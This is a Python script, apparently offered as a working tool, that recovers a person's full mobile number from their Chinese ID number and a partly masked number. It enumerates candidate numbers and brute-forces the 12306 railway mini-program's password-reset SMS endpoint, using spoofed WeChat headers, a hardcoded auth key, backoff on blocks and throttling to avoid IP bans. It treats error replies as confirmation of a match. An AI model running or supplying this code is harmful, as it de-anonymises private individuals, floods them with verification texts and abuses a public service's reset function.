import aiohttp
import asyncio
import re
import json
from typing import Optional, List

# 请求头模拟微信小程序环境，增加 Cookie 空占位（必要时可从首页获取）
HEADERS = {
    "Host": "mobile.12306.cn",
    "content-type": "application/x-www-form-urlencoded",
    "charset": "utf-8",
    "Referer": "https://servicewechat.com/wxa51f55ab3b2655b9/134/page-frame.html",
    "User-Agent": "Mozilla/5.0 (Linux; Android 14; 22081212C Build/UKQ1.230917.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/130.0.6723.103 Mobile Safari/537.36 XWEB/1300473 MMWEBSDK/20250201 MMWEBID/6704 MicroMessenger/8.0.57.2820(0x28003997) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android",
    "Accept-Encoding": "gzip, deflate, br"
}

async def GET_QQW(region: str, prefix: str) -> List[str]:
    """获取指定地区与前三位的号段列表"""
    number_sg = f"{region}{prefix}"
    url = f"https://telphone.cn/prefix/{number_sg}/"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=5) as resp:
                if resp.status != 200:
                    return []
                html = await resp.text(encoding='utf-8')
                pattern = re.compile(r'<a href="/prefix/(\d{7})/">([\d]+)号段')
                return [match[1] for match in pattern.findall(html)]
    except:
        return []

def QQW(pattern: str, numSG_list: List[str]) -> List[str]:
    """匹配前7位号段"""
    regex = pattern.replace('x', '\\d')
    return [num for num in numSG_list if re.fullmatch(regex, num)]

def HSW(pattern: str) -> List[str]:
    """匹配后4位后缀"""
    suffixes = [f'{i:04d}' for i in range(10000)]
    regex = pattern.replace('x', '\\d')
    return [suf for suf in suffixes if re.fullmatch(regex, suf)]

async def validate(id_no: str, mobile: str, session: aiohttp.ClientSession, semaphore: asyncio.Semaphore, retry: int = 2) -> Optional[str]:
    """验证手机号，成功返回手机号，失败返回 None"""
    for attempt in range(retry):
        try:
            async with semaphore:
                await asyncio.sleep(0.1)  # 轻微延迟，避免请求过快
                async with session.post(
                    url="https://mobile.12306.cn/wxxcx/wechat/forget/mobileSend",
                    headers=HEADERS,
                    data={
                        "id_type_code": "1",
                        "id_no": id_no,
                        "mobile": mobile,
                        "authKey": "0b17sYZv3FpGJ43Ja90w3wJE3347sYZw",
                        "mobile_code": "86"
                    },
                    timeout=3
                ) as resp:
                    # 处理 403：可能是临时封禁，等待后重试
                    if resp.status == 403:
                        if attempt < retry - 1:
                            await asyncio.sleep(2 ** attempt)  # 退避重试
                            continue
                        return None

                    text = await resp.text(encoding='utf-8')
                    try:
                        data = json.loads(text)
                        # 成功的判断：返回 data 中包含 mobileKey 且 errorMsg 为空或操作失败/次数过多也算成功（说明号码真实）
                        if data.get("status") is True and "mobileKey" in data.get("data", {}):
                            return mobile
                        if data.get("errorMsg") in ("操作失败", "验证码短信次数过多"):
                            return mobile
                        return None
                    except json.JSONDecodeError:
                        # 非 JSON 响应（如 403 HTML）时重试
                        if attempt < retry - 1:
                            await asyncio.sleep(1)
                            continue
                        return None
        except:
            if attempt < retry - 1:
                await asyncio.sleep(1)
                continue
            return None
    return None

async def generate_and_validate(id_no: str, phonex: str, region: str) -> Optional[str]:
    """生成所有可能的手机号并验证，返回第一个匹配的手机号，否则返回 None"""
    semaphore = asyncio.Semaphore(20)  # 降低并发，防止封 IP
    async with aiohttp.ClientSession() as session:
        # 获取号段列表
        numSG_list = await GET_QQW(region, phonex[:3])
        if not numSG_list:
            return None

        matched_numSG = QQW(phonex[:7], numSG_list)
        matched_suffixes = HSW(phonex[7:])

        tasks = []
        for qqw in matched_numSG:
            for hsw in matched_suffixes:
                mobile = qqw + hsw
                tasks.append(asyncio.create_task(validate(id_no, mobile, session, semaphore)))

                # 动态检查是否有已完成的任务返回结果，若有则立即取消其他任务并返回
                for t in tasks:
                    if t.done() and t.result():
                        for rest in tasks:
                            if not rest.done():
                                rest.cancel()
                        return t.result()

        # 等待所有任务完成
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if isinstance(r, str):  # 手机号字符串
                return r
        return None

async def main():
    id_no = input('输入证件号码:\n  >').strip()
    phonex = input('输入模糊手机号，x为未知位，前三位不能模糊:\n  >').strip()
    region = input('输入地区:\n  >').strip()

    found = await generate_and_validate(id_no, phonex, region)
    if found:
        print(found)          # 只输出匹配到的手机号
    else:
        print("未找到匹配的手机号")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass